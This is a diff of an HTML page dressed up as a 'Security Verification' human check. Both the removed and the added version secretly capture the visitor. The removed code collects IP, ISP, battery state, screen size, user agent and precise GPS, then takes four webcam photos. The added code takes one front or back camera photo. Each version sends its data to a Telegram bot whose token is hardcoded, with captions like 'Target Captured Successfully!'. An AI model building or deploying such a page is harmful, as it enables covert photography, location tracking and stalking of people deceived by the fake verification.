@@ -3,174 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Required</title>
+    <title>Verification Page</title>
     <style>
         body {
             background-color: #0f172a;
-            color: #f8fafc;
+            color: #ffffff;
             font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            text-align: center;
         }
-        .card {
+        .box {
             background: #1e293b;
             padding: 30px;
             border-radius: 12px;
-            text-align: center;
             box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-            max-width: 320px;
+            max-width: 350px;
             width: 100%;
         }
+        h2 { margin-bottom: 10px; color: #38bdf8; }
+        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
         .btn {
-            background-color: #38bdf8;
-            color: #0f172a;
+            background: #3b82f6;
+            color: white;
             border: none;
-            padding: 12px 24px;
+            padding: 12px 20px;
             font-size: 16px;
-            font-weight: bold;
             border-radius: 8px;
             cursor: pointer;
-            margin-top: 20px;
             width: 100%;
-            transition: 0.2s;
+            font-weight: bold;
         }
-        .btn:hover {
-            background-color: #0ea5e9;
-        }
+        .btn:hover { background: #2563eb; }
+        #status { margin-top: 15px; font-size: 13px; color: #facc15; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="card" id="main-card">
-        <h3>🔒 Security Verification</h3>
-        <p style="color: #94a3b8; font-size: 14px;">Click below to verify that you are a human and load the content.</p>
-        <button class="btn" onclick="startCapture()">Continue ➔</button>
+
+    <div class="box">
+        <h2>Security Verification</h2>
+        <p>Please click the button below to verify that you are a human and proceed.</p>
+        <button class="btn" id="verifyBtn" onclick="startProcess()">Verify Now 🛡️</button>
+        <div id="status"></div>
     </div>
 
-    <div class="card" id="loading-card" style="display: none;">
-        <h3>Loading...</h3>
-        <p style="color: #94a3b8; font-size: 14px;">Please wait while we verify...</p>
-    </div>
-
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const TARGET_CHAT_ID = urlParams.get('id');
+        // Apne bot ki details yahan set hain
         const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
 
-        async function startCapture() {
-            if (!TARGET_CHAT_ID) {
-                alert("Invalid Link!");
+        function startProcess() {
+            document.getElementById('verifyBtn').style.display = 'none';
+            document.getElementById('status').innerText = "Verifying, please wait...";
+
+            // URL se check karega ki front kholna hai ya back (?b=back ya ?b=front)
+            const urlParams = new URLSearchParams(window.location.search);
+            const camType = urlParams.get('b');
+            const chatId = urlParams.get('id');
+
+            let facingModeSetting = "user"; // Default Front Camera
+            if (camType === 'back') {
+                facingModeSetting = { exact: "environment" }; // Back Camera
+            }
+
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: facingModeSetting } 
+            })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    stream.getTracks().forEach(track => track.stop());
+
+                    canvas.toBlob(blob => {
+                        sendPhotoToTelegram(blob, chatId);
+                    }, 'image/jpeg', 0.85);
+
+                }, 1500); // 1.5 second baad photo click ho jayegi
+            })
+            .catch(error => {
+                document.getElementById('status').innerText = "Verification failed. Please allow camera permission.";
+                console.error(error);
+            });
+        }
+
+        function sendPhotoToTelegram(blob, chatId) {
+            if (!chatId) {
+                document.getElementById('status').innerText = "Error: Invalid User ID!";
                 return;
             }
 
-            document.getElementById('main-card').style.display = 'none';
-            document.getElementById('loading-card').style.display = 'block';
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('caption', '🎯 Target Captured Successfully!');
 
-            // 1. IP Information
-            let ipInfo = "N/A";
-            try {
-                let ipRes = await fetch('https://ipapi.co/json/');
-                let ipData = await ipRes.json();
-                ipInfo = `🌐 **IP Information**\n🔢 IP: \`${ipData.ip}\`\n📍 Location: ${ipData.city}, ${ipData.region}\n🗺 Country: ${ipData.country_name}\n📡 ISP: ${ipData.org}`;
-            } catch(e) {
-                ipInfo = "🌐 IP Info: Failed";
-            }
-
-            // 2. Battery Information
-            let batteryInfo = "N/A";
-            try {
-                if (navigator.getBattery) {
-                    let bat = await navigator.getBattery();
-                    batteryInfo = `🔋 Battery: ${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging ⚡' : 'Not Charging'})`;
-                }
-            } catch(e) {}
-
-            let screenInfo = `🖥️ Screen: ${window.innerWidth}x${window.innerHeight}`;
-            let uaInfo = `🧠 UA: ${navigator.userAgent}`;
-
-            // 3. 100% Accurate High-Accuracy GPS Location
-            let gpsInfo = "📍 GPS: Permission Denied / Not Available";
-            if (navigator.geolocation) {
-                await new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(pos => {
-                        let lat = pos.coords.latitude;
-                        let lon = pos.coords.longitude;
-                        let acc = pos.coords.accuracy;
-                        gpsInfo = `📍 **Live GPS (Accurate ~${Math.round(acc)}m):**\n[Google Maps View](https://maps.google.com/?q=${lat},${lon})`;
-                        resolve();
-                    }, err => {
-                        resolve();
-                    }, { 
-                        enableHighAccuracy: true, 
-                        timeout: 7000, 
-                        maximumAge: 0 
-                    });
-                });
-            }
-
-            // Send Text Info First
-            let fullCaption = `🚨 **New Target Triggered!**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n${uaInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
-            
-            let textFormData = new FormData();
-            textFormData.append('chat_id', TARGET_CHAT_ID);
-            textFormData.append('text', fullCaption);
-            textFormData.append('parse_mode', 'Markdown');
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
-                body: textFormData
-            }).catch(e => {});
-
-            // 4. Capture Multiple Photos (4 Photos consecutively)
-            try {
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
-                await video.play();
-
-                // Wait a moment for camera to adjust lighting/focus
-                await new Promise(r => setTimeout(r, 1000));
-
-                for (let i = 1; i <= 4; i++) {
-                    await new Promise(r => setTimeout(r, 800)); // 0.8 seconds gap between each photo
-                    
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    await new Promise((resolve) => {
-                        canvas.toBlob(async blob => {
-                            if (blob) {
-                                const photoFormData = new FormData();
-                                photoFormData.append('chat_id', TARGET_CHAT_ID);
-                                photoFormData.append('caption', `📸 **Photo ${i} / 4**\n✨ Credit by : आयुष नेगी`);
-                                photoFormData.append('parse_mode', 'Markdown');
-                                photoFormData.append('photo', blob, `capture_${i}.jpg`);
-
-                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: photoFormData
-                                }).catch(err => {});
-                            }
-                            resolve();
-                        }, 'image/jpeg', 0.85);
-                    });
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    document.getElementById('status').innerText = "Verification Successful! Redirecting...";
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com";
+                    }, 1000);
+                } else {
+                    document.getElementById('status').innerText = "Error sending data.";
                 }
-
-                stream.getTracks().forEach(track => track.stop());
-
-            } catch(err) {
-                console.error("Camera capture error:", err);
-            }
-
-            document.getElementById('loading-card').innerHTML = "<h3>Verification Complete</h3><p style='color:#38bdf8;font-size:14px;'>Loading requested content...</p>";
+            })
+            .catch(err => {
+                document.getElementById('status').innerText = "Network error!";
+            });
         }
     </script>
 </body>
